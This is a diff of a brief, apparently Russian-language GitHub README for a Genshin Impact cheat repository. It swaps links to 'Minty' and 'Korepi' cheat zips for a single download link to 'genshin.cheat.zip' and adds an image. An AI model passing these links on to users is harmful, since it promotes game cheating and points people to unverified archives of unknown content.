@@ -1,10 +1,7 @@
 # Genshin-Impact
 
+![image](https://github.com/spacecollapse/Genshin-Impact/assets/53594431/0195cfa8-eef9-4ac4-82be-11e5f0731262)
 
-Чит Minty - https://github.com/spacecollapse/Genshin-Impact/releases/download/cc/minty1.10.zip
 
 
-# Обновлённый Akebi
-
-скачать - https://github.com/spacecollapse/Genshin-Impact/releases/download/cc/Korepi.FFFF.zip
-
+Скачать - https://github.com/spacecollapse/Genshin-Impact/releases/download/cc/genshin.cheat.zip
